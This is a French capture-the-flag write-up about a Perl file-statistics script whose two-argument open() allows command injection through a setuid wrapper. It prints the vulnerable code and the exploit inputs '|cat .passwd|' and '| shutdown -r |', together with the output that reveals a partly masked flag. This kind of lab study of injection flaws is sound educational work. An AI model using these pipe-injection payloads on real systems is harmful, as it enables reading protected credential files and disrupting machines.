# Perl - Command injection

## Code source

```
#!/usr/bin/perl
 
delete @ENV{qw(IFS CDPATH ENV BASH_ENV)};
$ENV{'PATH'}='/bin:/usr/bin';
 
use strict;
use warnings;
 
main();
 
sub main {
    my ($file, $line) = @_;
 
    menu();
    prompt();
 
    while((my $file = <STDIN>)) {
        chomp $file;
 
        process_file($file);
 
        prompt();
    }
}
 
sub prompt {
    local $| = 1;
    print ">>> ";
}
sub menu {
    print "*************************\n";
    print "* Stat File Service    *\n";
    print "*************************\n";
}
 
sub check_read_access {
    my $f = shift;
 
    if(-f $f) {
        my $filemode = (stat($f))[2];
 
        return ($filemode & 4);
    }
 
    return 0;
}
 
sub process_file {
    my $file = shift;
    my $line;
    my ($line_count, $char_count, $word_count) = (0,0,0);
 
    $file =~ /(.+)/;
    $file = $1;
    if(!open(F, $file)) {
        die "[-] Can't open $file: $!\n";
    }
 
 
    while(($line = <F>)) {
        $line_count++;
        $char_count += length $line;
        $word_count += scalar(split/\W+/, $line);
    }
 
    print "~~~ Statistics for \"$file\" ~~~\n";
    print "Lines: $line_count\n";
    print "Words: $word_count\n";
    print "Chars: $char_count\n";
 
    close F;
}
```

## Procédure

1. Dans la machine je vois un fichier setuid-wrapper.c qui contient 

```
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

/* setuid script wrapper */

int main()
{
    setreuid(geteuid(), geteuid());
    system("/challenge/app-script/ch7/ch7.pl");
    return 0;
}
```

Cela me permet d'avoir les droits sur l'ouverture du fichier .passwd si une exploitation se trouve à l'intérieur du fichier ch7.pl

2. Exécution du script

```
./setuid-wrapper

*************************
* Stat File Service    *
*************************
>>> ch7.pl
~~~ Statistics for "ch7.pl" ~~~
Lines: 73
Words: 164
Chars: 1186
```

La faille se trouve donc au niveau de la fonction open() 

3. Recherche de faille Command Injection pour open() en Perl

Ce site répertorie la faille existante : https://cheatsheet.haax.fr/linux-systems/programing-languages/perl/

```
# Perl command injection
# open() function is vulnerable and can be used to execute commands
# ex : “| shutdown -r |”
```

4. Exploitation de la faille

```
./setuid-wrapper

*************************
* Stat File Service    *
*************************
>>> |cat .passwd|
Can't open bidirectional pipe at /challenge/app-script/ch7/ch7.pl line 55, <STDIN> line 1.
~~~ Statistics for "|cat .passwd|" ~~~
Lines: 0
Words: 0
Chars: 0
PerXXXXXXXXXXXXXink
```

